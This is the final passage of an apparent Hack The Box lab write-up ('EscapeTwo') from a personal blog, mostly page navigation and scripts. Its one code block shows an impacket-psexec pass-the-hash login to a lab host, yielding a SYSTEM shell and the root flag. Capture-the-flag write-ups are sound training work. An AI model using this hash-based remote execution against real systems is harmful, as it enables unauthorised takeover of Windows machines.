+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ impacket-psexec Administrator@10.10.11.51 -hashes aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Requesting shares on 10.10.11.51.....</span><br><span class="line">[-] share &#x27;Accounting Department&#x27; is not writable.</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file aMDPWilu.exe</span><br><span class="line">[*] Opening SVCManager on 10.10.11.51.....</span><br><span class="line">[*] Creating service xYcX on 10.10.11.51.....</span><br><span class="line">[*] Starting service xYcX.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">Microsoft Windows [Version 10.0.17763.6640]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; dir C:\Users\Administrator\Desktop</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 3705-289D</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line">01/04/2025  07:58 AM    &lt;DIR&gt;          .</span><br><span class="line">01/04/2025  07:58 AM    &lt;DIR&gt;          ..</span><br><span class="line">01/12/2025  06:23 AM                34 root.txt</span><br><span class="line">               1 File(s)             34 bytes</span><br><span class="line">               2 Dir(s)   3,190,370,304 bytes free</span><br></pre></td></tr></table></figure></div>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-escapetwo/Pasted image 20250112225853.png"
+                      width="500"
+                ></li>
+</ol>
+
+		</div>
+
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/HTB/">#HTB</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Windows/">#Windows</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/08/16/Hackthebox/htb-underpass/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">HTB-UnderPass</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/08/16/Hackthebox/htb-administrator/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">HTB-Administrator</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">HTB-EscapeTwo</div>
+		
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2025</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-regular fa-computer-classic"></i>&nbsp;&nbsp;<a href="/">Muyi</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        37 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog "></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
